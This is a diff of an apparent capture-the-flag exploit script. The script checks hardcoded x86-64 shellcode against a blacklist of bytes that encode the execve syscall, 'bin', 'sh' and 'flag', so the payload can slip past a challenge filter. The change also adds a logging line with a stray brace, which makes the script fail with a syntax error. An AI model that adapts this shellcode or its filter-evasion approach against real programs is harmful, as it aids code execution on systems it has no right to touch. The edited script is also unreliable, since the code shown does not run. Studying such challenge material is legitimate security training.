@@ -7,8 +7,7 @@ io = ptr.Process(elf.filepath)
 
 
 def check(shellcode: bytes):
-    # blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
-    blacklist = [59, 84, 98, 105, 110, 115, 104, 246, 210, 192, 95, 201, 102, 108, 97, 103]
+    blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
     for byte in shellcode:
         if byte in blacklist:
             return [False, byte]
@@ -18,7 +17,7 @@ def check(shellcode: bytes):
 shellcode = b"\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\x31\xDB\xBA\x3C\x00\x00\x00\x48\x8D\x5D\xB0\x48\x89\xDE\xE8\x00\x00\x00\x00\x48\x8D\x45\xB0\xFF\xD0"
 result = check(shellcode)
 if not result[0]:
-    ptr.logger.error(b"shellcode check failed " + chr(result[1]).encode())
+    ptr.logger.error(b"shellcode check failed " +  chr(result[1]).encode()})
 
 
 # io.sendline(shellcode1)
